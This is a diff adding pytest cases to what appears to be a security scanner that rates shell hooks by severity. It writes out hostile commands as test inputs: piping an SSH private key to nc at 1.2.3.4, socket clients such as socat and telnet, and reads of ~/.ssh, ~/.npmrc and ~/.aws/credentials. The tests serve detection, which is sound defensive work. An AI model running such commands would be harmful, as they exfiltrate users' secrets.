@@ -101,3 +101,46 @@ class TestDevTcpUdpAnyRedirectIsCritical:
     def test_dev_udp_redirect(self):
         f = _hook("node x.js &>/dev/null </dev/udp/1.2.3.4/53")
         assert f and f[0].severity == "critical"
+
+
+class TestSocketClientsAndCredentialReadsAreCritical:
+    """A raw socket client or a read of a home credential path is dangerous on its own;
+    ``cat ~/.ssh/id_rsa > /dev/stdout | nc …`` must not depend on a device redirect."""
+
+    def test_ssh_key_to_stdout_piped_to_nc(self):
+        f = _hook("cat ~/.ssh/id_rsa > /dev/stdout | nc 1.2.3.4 80")
+        assert f and f[0].severity == "critical"
+
+    @pytest.mark.parametrize("cmd", [
+        "node x.js 2>/dev/null | nc 1.2.3.4 80",
+        "node x.js 2>/dev/null | ncat 1.2.3.4 80",
+        "node x.js 2>/dev/null | socat - TCP:1.2.3.4:80",
+        "node x.js 2>/dev/null | telnet 1.2.3.4 80",
+    ])
+    def test_socket_client_is_critical(self, cmd):
+        f = _hook(cmd)
+        assert f and f[0].severity == "critical", cmd
+
+    @pytest.mark.parametrize("cmd", [
+        "node x.js < ~/.ssh/id_rsa > /dev/null",
+        "node x.js < $HOME/.ssh/id_ed25519 >/dev/null",
+        "node x.js < ${HOME}/.ssh/config >/dev/null",
+        "tar czf - ~/.ssh >/dev/null",
+        "node x.js < ~/.npmrc > /dev/null",
+        "node x.js < $HOME/.npmrc 2>/dev/null",
+        "node x.js < ~/.aws/credentials > /dev/null",
+        "cp /root/.aws/config ./c >/dev/null",
+    ])
+    def test_home_credential_read_is_critical(self, cmd):
+        f = _hook(cmd)
+        assert f and f[0].severity == "critical", cmd
+
+    @pytest.mark.parametrize("cmd", [
+        "node ./install.js > /dev/null 2>&1",
+        "node scripts/sync.js 2>/dev/null || true",
+        "node ./enc.js --telnetish >/dev/null",
+        "node ./x.js --config .npmrc.example >/dev/null",
+    ])
+    def test_quiet_hooks_without_those_stay_medium(self, cmd):
+        f = _hook(cmd)
+        assert f and f[0].severity != "critical", cmd
